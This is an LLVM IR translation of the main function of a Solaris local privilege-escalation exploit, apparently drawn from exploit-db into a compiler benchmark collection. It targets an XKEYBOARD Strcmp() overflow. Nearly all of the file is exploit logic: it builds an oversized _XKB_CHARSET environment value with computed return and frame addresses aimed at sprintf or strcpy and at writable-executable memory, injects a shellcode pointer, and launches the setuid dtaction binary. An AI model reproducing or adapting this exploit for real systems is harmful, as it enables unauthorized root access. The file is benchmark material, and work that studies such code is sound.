; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_2330.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_2330.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"X11R6 XKEYBOARD extension Strcmp() for Sun Solaris 8 9 10 SPARC\0A\00", align 1
@.str.1 = private unnamed_addr constant [58 x i8] c"Copyright 2006 RISE Security <contact@risesecurity.org>\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [42 x i8] c"usage: %s sprintf|strcpy xserver:display\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [8 x i8] c"sprintf\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"strcpy\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@SI_PLATFORM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [8 x i8] c"sysinfo\00", align 1
@ARGSIZE = common dso_local global i32 0, align 4
@ENVSIZE = common dso_local global i32 0, align 4
@PFMSIZE = common dso_local global i32 0, align 4
@PRGSIZE = common dso_local global i32 0, align 4
@BUFSIZE = common dso_local global i32 0, align 4
@FRMSIZE = common dso_local global i32 0, align 4
@ADRSIZE = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [14 x i8] c"_XKB_CHARSET=\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [21 x i8] c"/usr/dt/bin/dtaction\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"AAAAAAA\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [8192 x i8], align 16
  %7 = alloca [256 x i8], align 16
  %8 = alloca [256 x i8], align 16
  %9 = alloca [8 x [4 x i8]], align 16
  %10 = alloca [6 x i8*], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %15, align 4
  %16 = call i32 @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %17 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.1, i64 0, i64 0))
  %18 = load i32, i32* %4, align 4
  %19 = icmp ne i32 %18, 3
  br i1 %19, label %20, label %28

20:                                               ; preds = %2
  %21 = load i32, i32* @stderr, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @fprintf(i32 %21, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0), i8* %24)
  %26 = load i32, i32* @EXIT_FAILURE, align 4
  %27 = call i32 @exit(i32 %26) #3
  unreachable

28:                                               ; preds = %2
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @strcmp(i8* %31, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %35, label %34

34:                                               ; preds = %28
  store i32 1, i32* %15, align 4
  br label %35

35:                                               ; preds = %34, %28
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 1
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %42, label %41

41:                                               ; preds = %35
  store i32 2, i32* %15, align 4
  br label %42

42:                                               ; preds = %41, %35
  %43 = load i32, i32* %15, align 4
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %53, label %45

45:                                               ; preds = %42
  %46 = load i32, i32* @stderr, align 4
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @fprintf(i32 %46, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0), i8* %49)
  %51 = load i32, i32* @EXIT_FAILURE, align 4
  %52 = call i32 @exit(i32 %51) #3
  unreachable

53:                                               ; preds = %42
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 2
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @snprintf(i8* %54, i32 256, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i8* %57)
  %59 = load i32, i32* @SI_PLATFORM, align 4
  %60 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %61 = call i32 @sysinfo(i32 %59, i8* %60, i32 256)
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %67

63:                                               ; preds = %53
  %64 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  %65 = load i32, i32* @EXIT_FAILURE, align 4
  %66 = call i32 @exit(i32 %65) #3
  unreachable

67:                                               ; preds = %53
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 0
  %70 = load i8*, i8** %69, align 8
  %71 = ptrtoint i8* %70 to i32
  %72 = or i32 %71, 65535
  store i32 %72, i32* %12, align 4
  %73 = load i32, i32* %12, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %12, align 4
  %75 = load i32, i32* @ARGSIZE, align 4
  %76 = load i32, i32* @ENVSIZE, align 4
  %77 = add nsw i32 %75, %76
  %78 = load i32, i32* @PFMSIZE, align 4
  %79 = add nsw i32 %77, %78
  %80 = load i32, i32* @PRGSIZE, align 4
  %81 = add nsw i32 %79, %80
  store i32 %81, i32* %13, align 4
  %82 = load i32, i32* %13, align 4
  %83 = call i32 @PAD(i32 %82, i32 1, i32 47)
  %84 = load i32, i32* %12, align 4
  %85 = load i32, i32* %13, align 4
  %86 = sub nsw i32 %84, %85
  %87 = load i32, i32* @ARGSIZE, align 4
  %88 = add nsw i32 %86, %87
  %89 = load i32, i32* @BUFSIZE, align 4
  %90 = add nsw i32 %88, %89
  %91 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 0
  %92 = getelementptr inbounds [4 x i8], [4 x i8]* %91, i64 0, i64 0
  %93 = bitcast i8* %92 to i32*
  store i32 %90, i32* %93, align 16
  %94 = load i32, i32* %12, align 4
  %95 = load i32, i32* %13, align 4
  %96 = sub nsw i32 %94, %95
  %97 = load i32, i32* @ARGSIZE, align 4
  %98 = add nsw i32 %96, %97
  %99 = load i32, i32* @BUFSIZE, align 4
  %100 = add nsw i32 %98, %99
  %101 = load i32, i32* @FRMSIZE, align 4
  %102 = add nsw i32 %100, %101
  %103 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 1
  %104 = getelementptr inbounds [4 x i8], [4 x i8]* %103, i64 0, i64 0
  %105 = bitcast i8* %104 to i32*
  store i32 %102, i32* %105, align 4
  %106 = load i32, i32* %12, align 4
  %107 = load i32, i32* %13, align 4
  %108 = sub nsw i32 %106, %107
  %109 = load i32, i32* @ARGSIZE, align 4
  %110 = add nsw i32 %108, %109
  %111 = load i32, i32* @BUFSIZE, align 4
  %112 = add nsw i32 %110, %111
  %113 = load i32, i32* @FRMSIZE, align 4
  %114 = add nsw i32 %112, %113
  %115 = load i32, i32* @ADRSIZE, align 4
  %116 = add nsw i32 %114, %115
  %117 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 2
  %118 = getelementptr inbounds [4 x i8], [4 x i8]* %117, i64 0, i64 0
  %119 = bitcast i8* %118 to i32*
  store i32 %116, i32* %119, align 8
  %120 = load i32, i32* %15, align 4
  switch i32 %120, label %135 [
    i32 1, label %121
    i32 2, label %128
  ]

121:                                              ; preds = %67
  %122 = call i64 @find_symbol(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %123 = trunc i64 %122 to i32
  %124 = sub nsw i32 %123, 4
  %125 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 3
  %126 = getelementptr inbounds [4 x i8], [4 x i8]* %125, i64 0, i64 0
  %127 = bitcast i8* %126 to i32*
  store i32 %124, i32* %127, align 4
  br label %135

128:                                              ; preds = %67
  %129 = call i64 @find_symbol(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %130 = trunc i64 %129 to i32
  %131 = sub nsw i32 %130, 4
  %132 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 3
  %133 = getelementptr inbounds [4 x i8], [4 x i8]* %132, i64 0, i64 0
  %134 = bitcast i8* %133 to i32*
  store i32 %131, i32* %134, align 4
  br label %135

135:                                              ; preds = %128, %67, %121
  %136 = call i64 (...) @find_rwxmem()
  %137 = trunc i64 %136 to i32
  %138 = add nsw i32 %137, 4
  %139 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 4
  %140 = getelementptr inbounds [4 x i8], [4 x i8]* %139, i64 0, i64 0
  %141 = bitcast i8* %140 to i32*
  store i32 %138, i32* %141, align 16
  %142 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 4
  %143 = getelementptr inbounds [4 x i8], [4 x i8]* %142, i64 0, i64 0
  %144 = bitcast i8* %143 to i32*
  %145 = load i32, i32* %144, align 16
  %146 = sub nsw i32 %145, 8
  %147 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 5
  %148 = getelementptr inbounds [4 x i8], [4 x i8]* %147, i64 0, i64 0
  %149 = bitcast i8* %148 to i32*
  store i32 %146, i32* %149, align 4
  %150 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  store i8* %150, i8** %11, align 8
  %151 = load i8*, i8** %11, align 8
  %152 = call i32 @sprintf(i8* %151, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0))
  %153 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %154 = getelementptr inbounds i8, i8* %153, i64 13
  store i8* %154, i8** %11, align 8
  store i32 0, i32* %14, align 4
  br label %155

155:                                              ; preds = %161, %135
  %156 = load i32, i32* %14, align 4
  %157 = icmp slt i32 %156, 256
  br i1 %157, label %158, label %164

158:                                              ; preds = %155
  %159 = load i8*, i8** %11, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %11, align 8
  store i8 65, i8* %159, align 1
  br label %161

161:                                              ; preds = %158
  %162 = load i32, i32* %14, align 4
  %163 = add nsw i32 %162, 1
  store i32 %163, i32* %14, align 4
  br label %155

164:                                              ; preds = %155
  store i32 0, i32* %14, align 4
  br label %165

165:                                              ; preds = %177, %164
  %166 = load i32, i32* %14, align 4
  %167 = icmp slt i32 %166, 66
  br i1 %167, label %168, label %180

168:                                              ; preds = %165
  %169 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 1
  %170 = load i32, i32* %14, align 4
  %171 = srem i32 %170, 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [4 x i8], [4 x i8]* %169, i64 0, i64 %172
  %174 = load i8, i8* %173, align 1
  %175 = load i8*, i8** %11, align 8
  %176 = getelementptr inbounds i8, i8* %175, i32 1
  store i8* %176, i8** %11, align 8
  store i8 %174, i8* %175, align 1
  br label %177

177:                                              ; preds = %168
  %178 = load i32, i32* %14, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %14, align 4
  br label %165

180:                                              ; preds = %165
  %181 = load i8*, i8** %11, align 8
  store i8 0, i8* %181, align 1
  %182 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %183 = getelementptr inbounds i8, i8* %182, i64 13
  %184 = getelementptr inbounds i8, i8* %183, i64 256
  %185 = getelementptr inbounds i8, i8* %184, i64 56
  %186 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 0
  %187 = getelementptr inbounds [4 x i8], [4 x i8]* %186, i64 0, i64 0
  %188 = call i32 @memcpy(i8* %185, i8* %187, i32 4)
  %189 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %190 = getelementptr inbounds i8, i8* %189, i64 13
  %191 = getelementptr inbounds i8, i8* %190, i64 256
  %192 = getelementptr inbounds i8, i8* %191, i64 60
  %193 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 3
  %194 = getelementptr inbounds [4 x i8], [4 x i8]* %193, i64 0, i64 0
  %195 = call i32 @memcpy(i8* %192, i8* %194, i32 4)
  %196 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %197 = getelementptr inbounds i8, i8* %196, i64 1024
  store i8* %197, i8** %11, align 8
  store i32 0, i32* %14, align 4
  br label %198

198:                                              ; preds = %212, %180
  %199 = load i32, i32* %14, align 4
  %200 = load i32, i32* @FRMSIZE, align 4
  %201 = sub nsw i32 %200, 1
  %202 = icmp slt i32 %199, %201
  br i1 %202, label %203, label %215

203:                                              ; preds = %198
  %204 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 1
  %205 = load i32, i32* %14, align 4
  %206 = srem i32 %205, 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [4 x i8], [4 x i8]* %204, i64 0, i64 %207
  %209 = load i8, i8* %208, align 1
  %210 = load i8*, i8** %11, align 8
  %211 = getelementptr inbounds i8, i8* %210, i32 1
  store i8* %211, i8** %11, align 8
  store i8 %209, i8* %210, align 1
  br label %212

212:                                              ; preds = %203
  %213 = load i32, i32* %14, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %14, align 4
  br label %198

215:                                              ; preds = %198
  %216 = load i8*, i8** %11, align 8
  store i8 0, i8* %216, align 1
  %217 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %218 = getelementptr inbounds i8, i8* %217, i64 1024
  %219 = getelementptr inbounds i8, i8* %218, i64 32
  %220 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 4
  %221 = getelementptr inbounds [4 x i8], [4 x i8]* %220, i64 0, i64 0
  %222 = call i32 @memcpy(i8* %219, i8* %221, i32 4)
  %223 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %224 = getelementptr inbounds i8, i8* %223, i64 1024
  %225 = getelementptr inbounds i8, i8* %224, i64 36
  %226 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 2
  %227 = getelementptr inbounds [4 x i8], [4 x i8]* %226, i64 0, i64 0
  %228 = call i32 @memcpy(i8* %225, i8* %227, i32 4)
  %229 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %230 = getelementptr inbounds i8, i8* %229, i64 1024
  %231 = getelementptr inbounds i8, i8* %230, i64 60
  %232 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 5
  %233 = getelementptr inbounds [4 x i8], [4 x i8]* %232, i64 0, i64 0
  %234 = call i32 @memcpy(i8* %231, i8* %233, i32 4)
  %235 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %236 = getelementptr inbounds i8, i8* %235, i64 2048
  store i8* %236, i8** %11, align 8
  store i32 0, i32* %14, align 4
  br label %237

237:                                              ; preds = %251, %215
  %238 = load i32, i32* %14, align 4
  %239 = load i32, i32* @ADRSIZE, align 4
  %240 = sub nsw i32 %239, 1
  %241 = icmp slt i32 %238, %240
  br i1 %241, label %242, label %254

242:                                              ; preds = %237
  %243 = getelementptr inbounds [8 x [4 x i8]], [8 x [4 x i8]]* %9, i64 0, i64 1
  %244 = load i32, i32* %14, align 4
  %245 = srem i32 %244, 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds [4 x i8], [4 x i8]* %243, i64 0, i64 %246
  %248 = load i8, i8* %247, align 1
  %249 = load i8*, i8** %11, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %11, align 8
  store i8 %248, i8* %249, align 1
  br label %251

251:                                              ; preds = %242
  %252 = load i32, i32* %14, align 4
  %253 = add nsw i32 %252, 1
  store i32 %253, i32* %14, align 4
  br label %237

254:                                              ; preds = %237
  %255 = load i8*, i8** %11, align 8
  store i8 0, i8* %255, align 1
  %256 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %257 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 0
  store i8* %256, i8** %257, align 16
  %258 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 1024
  %259 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 1
  store i8* %258, i8** %259, align 8
  %260 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 2048
  %261 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 2
  store i8* %260, i8** %261, align 16
  %262 = load i8*, i8** @shellcode, align 8
  %263 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 3
  store i8* %262, i8** %263, align 8
  %264 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %265 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 4
  store i8* %264, i8** %265, align 16
  %266 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 5
  store i8* null, i8** %266, align 8
  %267 = getelementptr inbounds [6 x i8*], [6 x i8*]* %10, i64 0, i64 0
  %268 = call i32 @execle(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i32 0, i8** %267)
  %269 = load i32, i32* @EXIT_FAILURE, align 4
  %270 = call i32 @exit(i32 %269) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @sysinfo(i32, i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @PAD(i32, i32, i32) #1

declare dso_local i64 @find_symbol(i8*) #1

declare dso_local i64 @find_rwxmem(...) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
